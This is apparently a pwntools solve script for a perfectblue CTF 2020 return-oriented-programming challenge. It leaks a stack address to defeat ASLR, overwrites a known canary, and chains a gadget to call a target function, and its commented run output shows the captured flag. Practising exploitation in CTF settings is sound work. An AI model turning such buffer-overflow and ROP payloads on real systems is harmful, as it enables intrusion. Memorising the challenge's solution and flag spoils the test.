from pwn import *

def extract_stackvars(line1):
    tmp = line1.split('|')[1][1:].split(' ')
    var1 = int('0x' + ''.join(tmp[0:4][::-1]), 16)
    var2 = int('0x' + ''.join(tmp[4:8][::-1]), 16)

    return (var1, var2)


# p = process('./bof.bin')
p = remote('maze.chal.perfect.blue', 1)

p.sendlineafter('(Y/n)', 'n')
stack_snapshot = p.recvuntil('Input some text:').decode()
stack_snapshot = stack_snapshot.split('\n')
relative = extract_stackvars(stack_snapshot[9])[0]

base        = relative - 0x1599
pop_gadget  = base + 0x1396
int3_gadget = base + 0x13ad


payload  = b'A' * 0x30
payload += p32(0x67616c66)  # canary
payload += b'C' * 12
payload += p32(pop_gadget)  # pop esi; pop edi; pop ebp
payload += p32(0x1337)      # populating esi
payload += p32(0x31337)     # populating edi
payload += p32(0x1)
payload += p32(int3_gadget) # triggering do_cmds w/ correct parameters
payload += p32(0x1)         # populating eax

p.sendline(payload)
p.interactive()


# output:
# root at 88b7f55390f8 in ~/host-share/perfectblue-ctf-2020/amazing-rop/files
# (ins)$ python3 solve.v3.py
# [+] Opening connection to maze.chal.perfect.blue on port 1: Done
# [*] Switching to interactive mode

# 0xff82644c | 41 41 41 41 41 41 41 41 |
# 0xff826454 | 41 41 41 41 41 41 41 41 |
# 0xff82645c | 41 41 41 41 41 41 41 41 |
# 0xff826464 | 41 41 41 41 41 41 41 41 |
# 0xff82646c | 41 41 41 41 41 41 41 41 |
# 0xff826474 | 41 41 41 41 41 41 41 41 |
# 0xff82647c | 66 6c 61 67 43 43 43 43 |
# 0xff826484 | 43 43 43 43 43 43 43 43 |
# 0xff82648c | 96 03 64 56 37 13 00 00 |
# 0xff826494 | 37 13 03 00 00 00 00 00 |
# You did it! Congratuations!
# Returning to address: 0x56640396
# pbctf{hmm_s0mething_l00ks_off_w1th_th1s_s3tup}
# Segmentation fault
# [31337.1337] bof.bin[29215]: segfault at f7f85000 ip 00000000f7f85000 sp 00000000ff8264a8
# [*] Got EOF while reading in interactive
# $